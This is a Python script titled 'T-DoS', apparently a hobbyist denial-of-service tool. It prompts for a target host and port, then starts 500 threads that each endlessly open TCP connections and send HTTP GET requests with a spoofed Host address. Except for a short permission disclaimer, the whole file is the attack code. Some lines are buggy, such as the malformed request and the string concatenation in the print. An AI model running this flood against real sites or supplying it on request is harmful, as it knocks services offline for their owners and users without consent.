import os
from concurrent.futures import thread
import socket
import threading
os.system("clear")
os.system("toilet T-DoS")
print("Coded By: ParzivalHack")
print("Github: https://github.com/ParzivalHack")
print("Disclaimer: Illecit use of this tool could lead to a violation of federal and local laws.")
print("Use this tool only on your own website or websites from which you have obtained permission.")
print("License: The source code of this tool is under the MIT License.")
print("© 2022 Tommaso Bona")
print("Website IP finder: www.site24x7.com/find-ip-address-of-web-site.html")
target = str(input("Insert Target:"))
port = int(input("Insert Port:"))
fake_ip = '44.197.175.168'
attack_num = 0
def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target +"HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))

        global attack_num
        attack_num += 1
        print((attack_num) + ("packets sent"))

        s.close()
for i in range(500):
    thread = threading.Thread(target = attack)
    thread.start()    
